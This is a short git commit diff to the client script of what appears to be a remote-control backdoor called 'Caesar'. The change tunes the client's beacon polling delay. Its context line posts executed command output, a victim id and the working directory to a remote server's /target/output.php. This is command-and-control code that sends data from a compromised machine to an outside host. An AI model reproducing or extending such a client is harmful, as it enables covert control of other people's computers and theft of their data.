4451e501ba02f9b0a1de4d6c86f20ed1d132fd4a
Michele Cisternino <33893182+0blio@users.noreply.github.com>
2017-11-28 08:38:25 +0100

    Update client.py

--- Client/client.py
+++ Client/client.py
@@ -108,10 +108,10 @@ while 1:
 			r = requests.post ('http://' + caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
 
 	else:
-		# TODO: Check if delay != 10 before doing this
-		no_response += 1
-		if no_response == 60:
-			delay = 10
-			no_response = 0
+		if (delay != 10):
+			no_response += 1
+			if no_response == 60:
+				delay = 10
+				no_response = 0
 
 	sleep (delay)
